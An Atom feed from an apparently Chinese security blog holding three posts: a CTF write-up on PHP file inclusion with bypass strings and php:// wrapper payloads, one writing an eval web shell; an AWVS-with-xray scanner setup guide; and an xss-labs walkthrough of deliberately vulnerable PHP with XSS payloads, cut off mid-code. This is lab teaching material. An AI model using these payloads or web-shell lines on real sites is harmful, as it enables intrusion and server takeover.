<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Syst1m</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-05-26T14:41:03.897Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Syst1m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF-文件包含</title>
    <link href="http://example.com/2022/05/26/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://example.com/2022/05/26/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2022-05-26T13:48:19.000Z</published>
    <updated>2022-05-26T14:41:03.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含解析"><a href="#文件包含解析" class="headerlink" title="文件包含解析"></a>文件包含解析</h1><pre><code>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：include(),include_once()require(),require_once()这些文件包含函数，这些函数在代码设计中被经常使用到。大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205262150221.png"></p><h1 id="各种语言的文件包含"><a href="#各种语言的文件包含" class="headerlink" title="各种语言的文件包含"></a>各种语言的文件包含</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;1.asp&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include file=&quot;top.aspx&quot; --&gt;</span><br></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:<span class="keyword">import</span> url=<span class="string">&quot;http://thief.one/1.jsp&quot;</span>&gt;</span><br><span class="line">&lt;jsp:include page=<span class="string">&quot;head.jsp&quot;</span>/&gt;</span><br><span class="line">&lt;%@ include file=<span class="string">&quot;head.jsp&quot;</span>%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span>(<span class="string">&#x27;test.php&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>一些绕过文件包含之后添加后缀的方法</p><h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h2><ul><li>条件<br>  magic_quotes_gpc &#x3D; Off<br>  php版本&lt;5.3.4</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=…/…/…/www.txt%00</span><br></pre></td></tr></table></figure><h2 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h2><p>类似于脏数据填充</p><ul><li>条件<br>  windows:<code>.</code>长于256<br>  linux:<code>.</code>长于4096</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=…/…/…/www.......256个或者4096个......txt</span><br></pre></td></tr></table></figure><h2 id="号截断"><a href="#号截断" class="headerlink" title="?号截断"></a>?号截断</h2><p>不受GPC和PHP版本的影响，webserver会把问号当作请求的参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=1.txt?</span><br></pre></td></tr></table></figure><h2 id="特殊符号截断"><a href="#特殊符号截断" class="headerlink" title="特殊符号截断"></a>特殊符号截断</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%23</span><br><span class="line">%20</span><br></pre></td></tr></table></figure><h1 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h1><p>需要在php.ini中打开<code>allow_url_include</code>配置项</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt</span><br><span class="line">http://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt%20</span><br><span class="line">http://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt%23</span><br><span class="line">http://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt?</span><br></pre></td></tr></table></figure><h1 id="各种伪协议"><a href="#各种伪协议" class="headerlink" title="各种伪协议"></a>各种伪协议</h1><p><a href="https://www.cnblogs.com/endust/p/11804767.html">参考</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205262203868.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt</span><br><span class="line">http://127.0.0.1:8080/include.php?filename=php://input Post:&lt;?php system(<span class="string">&#x27;ver&#x27;</span>)?&gt;</span><br><span class="line">&lt;?PHP fputs(fopen(<span class="string">&#x27;s.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);?&gt;</span><br><span class="line">http://127.0.0.1:8080/include.php?filename=file:///D:/phpstudy/PHPTutorial/WWW/1.txt</span><br><span class="line">http://127.0.0.1:8080/include.php?filename=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h1 id="赛题"><a href="#赛题" class="headerlink" title="赛题"></a>赛题</h1><p><a href="http://4.chinalover.sinaapp.com/web7/index.php">南邮CTF平台-文件包含</a></p><p>使用文件包含读取,返回base64编码过后的源码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205262236992.png"></p><p>解码得到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205262238320.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;文件包含解析&quot;&gt;&lt;a href=&quot;#文件包含解析&quot; class=&quot;headerlink&quot; title=&quot;文件包含解析&quot;&gt;&lt;/a&gt;文件包含解析&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：
include(),include_once()
require(),require_once()
这些文件包含函数，这些函数在代码设计中被经常使用到。
大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：
1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。
因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205262150221.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;各种语言的文件包含&quot;&gt;&lt;a href=&quot;#各种语言的文件包含&quot; class=&quot;headerlink&quot; title=&quot;各种语言的文件包含&quot;&gt;&lt;/a&gt;各种语言的文件包含&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!--#include file=&amp;quot;1.asp&amp;quot; --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!--#include file=&amp;quot;top.aspx&amp;quot; --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>awvs联动xray扫描</title>
    <link href="http://example.com/2022/05/24/awvs%E8%81%94%E5%8A%A8xray%E6%89%AB%E6%8F%8F/"/>
    <id>http://example.com/2022/05/24/awvs%E8%81%94%E5%8A%A8xray%E6%89%AB%E6%8F%8F/</id>
    <published>2022-05-24T15:09:57.000Z</published>
    <updated>2022-05-24T15:38:51.778Z</updated>
    
    <content type="html"><![CDATA[<p>awvs 的爬虫很好用，支持表单分析和单页应用的爬取，xray 的扫描能力比较强，速度也更快。awvs 和 xray 搭配使用则是如虎添翼。<br><a href="https://docs.xray.cool/#/scenario/awvs">xray官方手册</a></p><h1 id="awvs安装"><a href="#awvs安装" class="headerlink" title="awvs安装"></a>awvs安装</h1><p><a href="https://hub.docker.com/r/secfa/awvs">docker镜像地址</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  pull 拉取下载镜像</span></span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"><span class="comment">#  将Docker的3443端口映射到物理机的 13443端口</span></span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容器的相关信息</span></span><br><span class="line">username: admin@admin.com</span><br><span class="line">password: Admin123</span><br><span class="line">AWVS版本：14</span><br><span class="line"></span><br><span class="line"><span class="comment">#如何更改凭据</span></span><br><span class="line"></span><br><span class="line">1.docker <span class="built_in">exec</span> -u root -it <span class="variable">$docker_names</span> /bin/bash</span><br><span class="line">2./home/acunetix/.acunetix/change_credentials.sh</span><br><span class="line">3.输入您的新凭证</span><br></pre></td></tr></table></figure><h1 id="xray安装"><a href="#xray安装" class="headerlink" title="xray安装"></a>xray安装</h1><p><a href="https://github.com/chaitin/xray/releases">下载地址</a></p><p>将xray添加为命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## xray</span></span><br><span class="line"><span class="built_in">alias</span> xray=<span class="string">&quot;/xray/xray_darwin_amd64&quot;</span> <span class="comment">#xray路径</span></span><br><span class="line"><span class="built_in">export</span> <span class="built_in">alias</span></span><br></pre></td></tr></table></figure><h1 id="联合使用"><a href="#联合使用" class="headerlink" title="联合使用"></a>联合使用</h1><ul><li><p>启动xray<br>首先启动 xray 的被动代理，下面的命令将启动一个监听在所有网卡 1111 端口的 HTTP 代理, 并将扫描结果保存在 awvs.html 内。</p><pre><code class="bash">xray webscan --listen 0.0.0.0:1111 --html-output awvs.html</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205242323790.png"></p></li><li><p>启动awvs<br>  打开awvs如果浏览器报 不是私密链接且没有继续访问,在awvs页面直接输入<code>thisisunsafe</code>,浏览器会自动跳转</p><p>  添加目标并设置为仅爬取,此处使用本地靶场环境<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205242324038.png"></p><p>  使用xray的代理,因为是docker环境,ip为<code>物理机的内网ip</code>,不能写127.0.0.1或者localhost,这样awvs容器才可以找到,如果xray在公网就写公网ip<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205242326873.png"></p></li><li><p>扫描<br>点击扫描后终端出现回显则表示成功<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205242329664.png"></p><p>  扫描结束后会出现一个awvs.html就是扫描结果,使用浏览器打开<br>  <img src="https://raw.githubusercontent.com/chencicici/images/main/202205242331538.png"></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;awvs 的爬虫很好用，支持表单分析和单页应用的爬取，xray 的扫描能力比较强，速度也更快。awvs 和 xray 搭配使用则是如虎添翼。&lt;br&gt;&lt;a href=&quot;https://docs.xray.cool/#/scenario/awvs&quot;&gt;xray官方手册&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;awvs安装&quot;&gt;&lt;a href=&quot;#awvs安装&quot; class=&quot;headerlink&quot; title=&quot;awvs安装&quot;&gt;&lt;/a&gt;awvs安装&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://hub.docker.com/r/secfa/awvs&quot;&gt;docker镜像地址&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#  pull 拉取下载镜像&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker pull secfa/docker-awvs&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#  将Docker的3443端口映射到物理机的 13443端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker run -it -d -p 13443:3443 secfa/docker-awvs&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 容器的相关信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;username: admin@admin.com&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;password: Admin123&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;AWVS版本：14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#如何更改凭据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1.docker &lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt; -u root -it &lt;span class=&quot;variable&quot;&gt;$docker_names&lt;/span&gt; /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2./home/acunetix/.acunetix/change_credentials.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3.输入您的新凭证&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;xray安装&quot;&gt;&lt;a href=&quot;#xray安装&quot; class=&quot;headerlink&quot; title=&quot;xray安装&quot;&gt;&lt;/a&gt;xray安装&lt;/h1&gt;</summary>
    
    
    
    <category term="工具" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="awvs" scheme="http://example.com/tags/awvs/"/>
    
    <category term="xray" scheme="http://example.com/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>xss-labs靶场</title>
    <link href="http://example.com/2022/05/19/xss-labs%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2022/05/19/xss-labs%E9%9D%B6%E5%9C%BA/</id>
    <published>2022-05-19T06:04:04.000Z</published>
    <updated>2022-05-19T09:38:58.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="less-01"><a href="#less-01" class="headerlink" title="less-01"></a>less-01</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反射型xss,无过滤</p></li><li><p>payload<br>对于XSS漏洞，在实战中未避免因关键字被发现，多采用h5标签进行试探。<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191420542.png"><br>注入XSS</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>  <img src="https://raw.githubusercontent.com/chencicici/images/main/202205191428059.png"></p></li></ul><h1 id="less-02"><a href="#less-02" class="headerlink" title="less-02"></a>less-02</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反射型XSS,<code>htmlspecialchars($str)</code>过滤,把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体</p></li><li><p>payload<br>此处需要将突破点转向value，首先应该闭合标签（“&gt;），在进行xss注入。</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=<span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>  <img src="https://raw.githubusercontent.com/chencicici/images/main/202205191444081.png"></p></li></ul><h1 id="less-03"><a href="#less-03" class="headerlink" title="less-03"></a>less-03</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br></pre></td></tr></table></figure><p>str和value都被<code>.htmlspecialchars($str)</code>过滤</p></li><li><p>payload<br>值得注意的是,value位于input标签上,可以使用鼠标事件绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onfocus=&#x27;javascript:alert(1)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205191503368.png"></p></li></ul><h1 id="less-04"><a href="#less-04" class="headerlink" title="less-04"></a>less-04</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上一关的基础上,替换<code>&lt;</code> <code>&gt;</code></p></li><li><p>payload<br>依旧可以使用特殊鼠标事件绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onfocus=&#x27;javascript:alert(1)&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="less-05"><a href="#less-05" class="headerlink" title="less-05"></a>less-05</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上关的基础上,替换<code>on</code>,并且全部小写,使用超链接绕过</p></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 